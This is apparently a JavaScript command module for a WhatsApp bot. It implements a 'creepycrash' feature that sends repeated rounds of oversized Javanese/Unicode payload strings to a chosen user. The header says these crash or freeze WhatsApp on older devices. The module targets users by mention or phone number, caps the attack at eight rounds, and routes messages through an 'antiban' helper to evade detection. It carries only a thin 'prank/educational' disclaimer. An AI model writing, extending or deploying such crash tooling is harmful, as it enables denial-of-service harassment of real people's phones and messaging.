/**
 * 🐛 Tech God Bug 2026 — Creepy Crash (Javanese Unicode Bomb)
 * Uses CREEPY_MD payloads — massive Javanese/Unicode strings that
 * crash or freeze WhatsApp on older devices.
 * ⚠️ EDUCATIONAL / PRANK USE ONLY
 * By Dev-Ntando (payload source: CREEPY_MD-V1)
 */
'use strict';

const config  = require('../../config');
const antiban = require('../../utils/antiban');
const db      = require('../../database');
const path    = require('path');
const fs      = require('fs');

// Load creepy payloads
const { creepyd1 } = require('./creepy-data/creepyd1');
const { creepyd2 } = require('./creepy-data/creepyd2');
const { creepyd3 } = require('./creepy-data/creepyd3');

const payloads = [creepyd1, creepyd2, creepyd3].filter(Boolean);

module.exports = async (sock, msg, args, { isOwner, sender, jid }) => {
  if (!config.bugsEnabled.crash) {
    return antiban.sendHuman(sock, jid, { text: '❌ Crash bugs are currently disabled.' }, { quoted: msg });
  }

  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  let target = mentioned[0] || (args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);

  if (!target) {
    return antiban.sendHuman(sock, jid, {
      text: `🐛 *Creepy Crash*\n\n*Usage:* ${config.prefix}creepycrash @user [rounds]\n*Example:* ${config.prefix}creepycrash @someone 3\n\n_Sends CREEPY Javanese Unicode bombs that crash WhatsApp on older devices._\n_Much heavier than normal crash._`,
    }, { quoted: msg });
  }

  const rounds = Math.min(parseInt(args[1]) || 3, 8);

  await antiban.sendHuman(sock, jid, {
    text: `🐛 *Sending CREEPY crash...*\n🎯 Target: @${target.split('@')[0]}\n💣 Rounds: ${rounds}\n⚡ Payload: Javanese Unicode Bomb`,
    mentions: [target]
  }, { quoted: msg });

  for (let i = 0; i < rounds; i++) {
    const payload = payloads[i % payloads.length];
    await sock.sendMessage(target, { text: payload });
    await new Promise(r => setTimeout(r, 600));
  }

  db.incrementStat('totalBugs');
  db.incrementUserStat(sender, 'bugs');

  await antiban.sendHuman(sock, jid, {
    text: `✅ *Creepy crash sent!*\n🐛 ${rounds} rounds of Javanese bombs delivered to @${target.split('@')[0]}`,
    mentions: [target]
  }, { quoted: msg });
};
